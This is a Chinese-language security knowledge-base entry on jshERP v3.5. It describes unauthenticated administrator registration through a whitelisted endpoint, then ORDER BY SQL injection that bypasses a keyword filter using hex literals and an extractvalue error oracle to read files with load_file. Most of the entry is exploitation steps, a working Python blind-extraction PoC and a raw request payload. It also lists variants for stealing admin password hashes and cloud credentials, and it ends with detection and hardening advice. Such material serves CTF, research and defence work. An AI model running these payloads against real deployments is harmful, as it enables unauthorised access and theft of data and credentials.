---
id: web-generic-sqli-jsherp-orderby-extractvalue-loadfile
title: jshERP 未授权注册 + ORDER BY 注入：safeSqlParse 删除关键字后用 extractvalue 盲注 load_file 读文件
type: scenario
domain: web
path: web/generic/sqli
technique: jsherp-orderby-extractvalue-file-read
aliases:
- jshERP 管伊佳 ERP SQL 注入
- jshERP v3.5 未授权
- safeSqlParse 绕过
- ORDER BY ${column} 注入
- extractvalue 报错盲注
- load_file 读 /flag
tags:
- java
- jsherp
- spring-boot
- sqli
- order-by
- extractvalue
- error-based
- load-file
- unauthenticated
- waf-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: jshERP v3.5（v3.6 为官方修复版）
verification:
  verified_by: verifier-V108
  verified_at: '2026-11-05T22:36:07+08:00'
  notes: 对照 Web Auto-2：v3.5 判定、316 接口、registerUser 白名单、safeSqlParse、0x/if/extractvalue/load_file oracle 一致；未复跑
---

## 一句话结论

jshERP v3.5 的 `/jshERP-boot/v2/api-docs` 与 `registerUser` 在鉴权白名单内，攻击者可未授权注册管理员并拿到 token；随后 `material/getListWithStock` 的 `column`/`order` 经 `safeSqlParse` 删除黑名单词后仍拼进 `ORDER BY ${column} ${order}`，用十六进制字面量、`if()` 与 `extractvalue()` 构造无引号报错 oracle，逐字符读出 `load_file('/flag')` 的内容。

## 原理

- **未授权面**：jshERP 的 `LogCostFilter` 在没有会话时只放行固定 URL，`/v2/api-docs`、`/user/login`、`/user/registerUser`、`/user/randomImage` 都在白名单内。Swagger 文档因此无登录态可读，暴露 316 个接口和 `UserEx` 全字段。
- **注册即管理员**：`registerUser` 把传入的 `UserEx` 直接 insert，并为新用户创建租户、绑定管理员；请求体中的 `ismanager` 等字段可被控制。注册后用同一账号登录，服务端返回 `X-Access-Token`，后续请求带上该头即可以管理员身份访问。
- **注入点**：`material/getListWithStock` 接收 `column` 与 `order`，先经过 `StringUtil.safeSqlParse`，再透传到 MyBatis mapper 的 `order by ${column} ${order}`。`safeSqlParse` 命中黑名单时把整词删除且不报错，黑名单包含单引号、`#`、`%`、`;`、`--` 以及 `and/or/not/select/union` 等关键字。
- **绕过机制**：字符串改用 `0x...` 十六进制字面量（引号会被删，`0x` 不会）；逻辑用 `if()` 代替 `and/or`；提取用 `extractvalue()` 搭配 `ascii()`/`substr()`。空格、括号、逗号、比较符不在黑名单内，足以拼出完整表达式。
- **报错 oracle**：MySQL 的 `extractvalue(1, xpath)` 在 XPath 非法时抛 `XPATH syntax error`。把 `if(条件, concat(0x7e,0x7e), 0x2f61)` 作为 XPath，条件为真时报错（HTTP 500），为假时返回正常（HTTP 200）。`if` 的常量条件在解析期求值，即使查询结果为零行也能触发，因此单请求即可判定，无需休眠。
- **文件读取**：目标 mysqld 以 `root` 运行且具备 `FILE` 权限（`current_user()` 首字符为 `r` 可确认），`load_file('/flag')` 可读容器内文件；用 `length(load_file(...))` 与 `ascii(substr(load_file(...),i,1))` 结合上述 oracle 二分/逐字符提取。

## 触发条件

- jshERP v3.5（原文以 v3.6 的接口差集确认线上为 v3.5，v3.6 为修复版）。
- `LogCostFilter` 白名单仍包含 `/v2/api-docs` 与 `/user/registerUser`；`UserService.insertUser` 不校验调用方身份。
- 目标 MySQL 账号具备 `FILE` 权限，且 `secure_file_priv` 允许读取目标路径；`load_file` 返回内容长度受 `max_allowed_packet` 等限制。
- 已知或可枚举管理员登录名；验证码可用 OCR（如 ddddocr）识别。

## 利用步骤

1. 访问 `/jshERP-boot/v2/api-docs`，确认无鉴权且能看到 `UserEx` 与 `registerUser` 接口。
2. 识别登录验证码（四字符 JPEG，OCR 或复用 session），向 `registerUser` 提交带 `ismanager=1` 的 `UserEx`；用注册账号登录获得 `X-Access-Token`。
3. 访问 `material/getListWithStock`，先发一个正常 `column=currentStock&order=asc` 建立基线。
4. 构造 `order`：`asc,extractvalue(1,if(<条件>,concat(0x7e,0x7e),0x2f61))`，观察 500/200 作为布尔 oracle。
5. 先盲注 `length(load_file(0x2f666c6167))`，再逐字符 `ascii(substr(load_file(0x2f666c6167),i,1))` 二分提取 `/flag`。
6. 若 `load_file` 被限制，改用 `extractvalue` 直接回显当前库表数据、管理员口令哈希，或进一步寻找 INTO OUTFILE 写文件。

## PoC

```python
def oracle(cond):
    payload = "asc,extractvalue(1,if(%s,concat(0x7e,0x7e),0x2f61))" % cond
    r = S.get(BASE + "/material/getListWithStock",
              headers={"X-Access-Token": TOKEN},
              params={"column": "currentStock", "order": payload})
    return "获取数据失败" in r.text   # 真值触发 XPATH 报错 -> 500

def read_file(path_hex, n):
    out = b""
    for i in range(1, n + 1):
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            cond = "ascii(substr(load_file(%s),%d,1))>%d" % (path_hex, i, mid)
            if oracle(cond):
                lo = mid + 1
            else:
                hi = mid
        out += bytes([lo])
    return out

print(read_file("0x2f666c6167", 64))   # /flag
```

```text
GET /jshERP-boot/material/getListWithStock?column=currentStock&order=asc,extractvalue(1,if(length(load_file(0x2f666c6167))>0,concat(0x7e,0x7e),0x2f61))
X-Access-Token: <token>
```

## 变体与关联

- 变体：`updatexml(1,concat(0x7e,(...)),1)` 同样可做报错回显；`if` 可换成 `case when`，但 `when` 含黑名单词需另行变形。
- 变体：若 `FILE` 权限不可用，可盲注业务库中的管理员哈希、租户密钥或 `systemConfig` 中的云凭据，再横向。
- 关联：[[web-generic-sqli-error-based-extraction]]（通用报错注入）、[[web-generic-sqli-bootdo-sort-order-token]]（同为 ORDER BY 注入）、[[web-java-component-jsherp-filter-prefix-normalization-plugin-rce]]（同一产品的补丁绕过与插件 RCE）。
- 边界：`safeSqlParse` 的具体黑名单随版本变化；`0x` 字面量在非 MySQL 数据库不通用；`load_file` 受 `secure_file_priv`、权限和文件大小限制。

## 检测与防御

- 检测：`/v2/api-docs`、`/user/registerUser` 的未授权访问与异常注册；`ORDER BY` 参数中出现 `extractvalue`、`updatexml`、`load_file`、`0x` 长十六进制串、`if(`；同一 token 短时间内大量 500/200 交替请求。
- 修复：升级到 v3.6+；把 `/v2/api-docs`、`registerUser` 移出白名单并加认证/邀请码；`insertUser` 强制服务端赋值角色与租户；`column`/`order` 用枚举白名单映射，禁止 `${}` 拼接。
- 加固：数据库账号降权、撤销 `FILE`；`secure_file_priv` 指向空目录；WAF 对 `extractvalue/updatexml/load_file` 与十六进制字面量告警；注册接口加验证码、限速与人工审核。
